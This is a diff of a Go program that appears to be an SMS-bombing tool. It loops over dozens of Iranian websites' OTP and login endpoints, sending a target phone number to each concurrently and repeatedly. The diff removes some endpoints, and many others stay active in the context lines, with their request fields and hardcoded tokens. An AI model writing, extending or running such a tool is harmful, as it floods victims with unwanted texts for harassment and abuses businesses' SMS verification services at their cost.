@@ -341,23 +341,6 @@ func main() {
 
 	// --- حلقه اصلی برای اضافه کردن وظایف ---
 	for i := 0; i < repeatCount; i++ {
-		// gifkart.com (SMS - POST Form) - مثال موجود در کد شما
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("PhoneNumber", phone)
-			sendFormRequest(ctx, "https://gifkart.com/request/", formData, &wg, ch)
-		}
-
-		// account724.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("action", "stm_login_register")
-			formData.Set("type", "mobile")
-			formData.Set("input", phone) // استفاده مستقیم از شماره تلفن ورودی
-			sendFormRequest(ctx, "https://account724.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
 
 		// nikanbike.com (SMS - POST Form) - نیاز به rand و verify_token (ممکن است پویا باشند)
 		wg.Add(1)
@@ -376,16 +359,6 @@ func main() {
 			sendFormRequest(ctx, "https://nikanbike.com/?rand=1745917742131", formData, &wg, ch) // rand ممکن است پویا باشد
 		}
 
-		// titomarket.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("route", "extension/websky_otp/module/websky_otp.send_code")
-			formData.Set("emailsend", "0")
-			formData.Set("telephone", phone) // استفاده مستقیم از شماره تلفن ورودی
-			sendFormRequest(ctx, "https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0", formData, &wg, ch)
-		}
-
 		// elecmarket.ir (SMS - POST Form)
 		wg.Add(1)
 		tasks <- func() {
@@ -394,19 +367,6 @@ func main() {
 			formData.Set("type", "mobile")
 			formData.Set("input", phone) // استفاده مستقیم از شماره تلفن ورودی
 			sendFormRequest(ctx, "https://elecmarket.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
-
-		// novinparse.com (SMS - POST Form) - ipaddress ممکن است نیاز به تنظیم پویا داشته باشد
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("Action", "SendVerifyCode")
-			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("verifyCode", "") // طبق نمونه شما خالی ارسال می‌شود
-			formData.Set("repeatFlag", "true")
-			formData.Set("Language", "FA")
-			formData.Set("ipaddress", "5.232.133.109") // ممکن است نیاز به IP واقعی ارسال کننده داشته باشد
-			sendFormRequest(ctx, "https://novinparse.com/page/pageaction.aspx", formData, &wg, ch)
 		}
 
 		// ickala.com (SMS - POST Form) - tokensms ممکن است پویا باشد
@@ -442,20 +402,6 @@ func main() {
 			sendGETRequest(ctx, url, &wg, ch)
 		}
 
-		// gitamehr.ir (SMS - POST Form) - نیاز به security token پویا (احتمال عدم موفقیت بالا)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("action", "mreeir_send_sms")
-			formData.Set("mobileemail", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("userisnotauser", "") // طبق نمونه خالی ارسال می‌شود
-			formData.Set("type", "mobile")
-			formData.Set("captcha", "") // طبق نمونه خالی ارسال می‌شود
-			formData.Set("captchahash", "") // طبق نمونه خالی ارسال می‌شود
-			formData.Set("security", "75d313bc3e") // این توکن پویا است
-			sendFormRequest(ctx, "https://gitamehr.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
-
 		// adinehbook.com (SMS - POST Form)
 		wg.Add(1)
 		tasks <- func() {
@@ -474,16 +420,6 @@ func main() {
 			formData.Set("action", "bakala_send_code")
 			formData.Set("phone_email", phone) // استفاده مستقیم از شماره تلفن ورودی
 			sendFormRequest(ctx, "https://maxbax.com/bakala/ajax/send_code/", formData, &wg, ch)
-		}
-
-		// zzzagros.com (SMS - POST Form) - نیاز به nonce پویا (احتمال عدم موفقیت بالا)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("action", "awsa-login-with-phone-send-code")
-			formData.Set("nonce", "9a4e9547c3") // این توکن پویا است
-			formData.Set("username", phone) // استفاده مستقیم از شماره تلفن ورودی
-			sendFormRequest(ctx, "https://www.zzzagros.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 		}
 
 		// mellishoes.ir (SMS - POST Form)
@@ -595,44 +531,6 @@ func main() {
 			sendFormRequest(ctx, "https://www.rubeston.com/api/customers/login-register", formData, &wg, ch)
 		}
 
-		// benedito.ir (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("version", "new1")
-			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("sdvssd45fsdv", "brtht33yjuj7s") // ارسال پارامتر ثابت از نمونه
-			sendFormRequest(ctx, "https://api.benedito.ir/v1/customer/register-login?version=new1", formData, &wg, ch)
-		}
-
-		// ubike.ir (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("action", "logini_first")
-			formData.Set("login", phone) // استفاده مستقیم از شماره تلفن ورودی
-			sendFormRequest(ctx, "https://ubike.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
-
-		// api-atlasmode.alochand.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("version", "new2")
-			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("sdlkjcvisl", "uikjdknfs") // ارسال پارامتر ثابت از نمونه
-			sendFormRequest(ctx, "https://api-atlasmode.alochand.com/v1/customer/register-login?version=new2", formData, &wg, ch)
-		}
-
-		// api.elinorboutique.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("sdlkjcvisl", "uikjdknfs") // ارسال پارامتر ثابت از نمونه
-			sendFormRequest(ctx, "https://api.elinorboutique.com/v1/customer/register-login", formData, &wg, ch)
-		}
-
 		// panel.hermeskala.com (SMS - POST JSON)
 		wg.Add(1)
 		tasks <- func() {
@@ -648,16 +546,6 @@ func main() {
 			formData := url.Values{}
 			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
 			sendFormRequest(ctx, "https://badparak.com/register/request_verification_code", formData, &wg, ch)
-		}
-
-		// chechilas.com (SMS - POST Form) - استفاده از فرمت بدون صفر اول
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("mob", getPhoneNumberNoZero(phone)) // حذف صفر اول
-			formData.Set("code", "") // طبق نمونه خالی
-			formData.Set("referral_code", "") // طبق نمونه خالی
-			sendFormRequest(ctx, "https://chechilas.com/user/login", formData, &wg, ch)
 		}
 
 		// kavirmotor.com (SMS - POST Form)
@@ -735,32 +623,6 @@ func main() {
 			sendJSONRequest(ctx, "https://igame.ir/Login/SendOtpCode", payload, &wg, ch)
 		}
 
-		// 4hair.ir (SMS - POST Form) - نیاز به security token پویا (احتمال عدم موفقیت بالا)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("action", "mreeir_send_sms")
-			formData.Set("mobileemail", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("userisnotauser", "") // طبق نمونه خالی
-			formData.Set("type", "mobile")
-			formData.Set("captcha", "") // طبق نمونه خالی
-			formData.Set("captchahash", "") // طبق نمونه خالی
-			formData.Set("security", "52771e6d1a") // این توکن پویا است
-			sendFormRequest(ctx, "https://4hair.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
-
-		// janebi.com (SMS - POST Form) - نیاز به csrf پویا (احتمال عدم موفقیت بالا)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("csrf", "4") // این توکن پویا است
-			formData.Set("user_mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("confirm_code", "") // طبق نمونه خالی
-			formData.Set("popup", "1")
-			formData.Set("signin", "1")
-			sendFormRequest(ctx, "https://janebi.com/signin", formData, &wg, ch)
-		}
-
 		// hamrahsport.com (SMS - POST Form)
 		wg.Add(1)
 		tasks <- func() {
@@ -773,30 +635,12 @@ func main() {
 			sendFormRequest(ctx, "https://hamrahsport.com/send-otp", formData, &wg, ch)
 		}
 
-		// api.pashikshoes.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("sdlkjcvisl", "uikjdknfs") // ارسال پارامتر ثابت از نمونه
-			sendFormRequest(ctx, "https://api.pashikshoes.com/v1/customer/register-login", formData, &wg, ch)
-		}
-
 		// www.ketabium.com (SMS - POST Form)
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
 			formData.Set("username", phone) // استفاده مستقیم از شماره تلفن ورودی
 			sendFormRequest(ctx, "https://www.ketabium.com/login-register", formData, &wg, ch)
-		}
-
-		// www.kanoonbook.ir (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("task", "customer_phone")
-			formData.Set("customer_username", phone) // استفاده مستقیم از شماره تلفن ورودی
-			sendFormRequest(ctx, "https://www.kanoonbook.ir/store/customer_otp", formData, &wg, ch)
 		}
 
 		// api.digighate.com (SMS - POST JSON) - نیاز به recaptchaToken پویا (احتمال عدم موفقیت بالا)
@@ -815,16 +659,6 @@ func main() {
 			// ساخت URL با پارامتر GET
 			url := fmt.Sprintf("https://api.hovalvakil.com/api/User/SendConfirmCode?userName=%s", phone) // استفاده مستقیم از شماره تلفن ورودی در URL
 			sendGETRequest(ctx, url, &wg, ch)
-		}
-
-		// api.paaakar.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("version", "new1")
-			formData.Set("mobile", phone) // استفاده مستقیم از شماره تلفن ورودی
-			formData.Set("sdlkjcvisl", "uikjdknfs") // ارسال پارامتر ثابت از نمونه
-			sendFormRequest(ctx, "https://api.paaakar.com/v1/customer/register-login?version=new1", formData, &wg, ch)
 		}
 
 		// martday.ir (Registration - POST Form) - از فیلد email برای شماره تلفن استفاده می کند
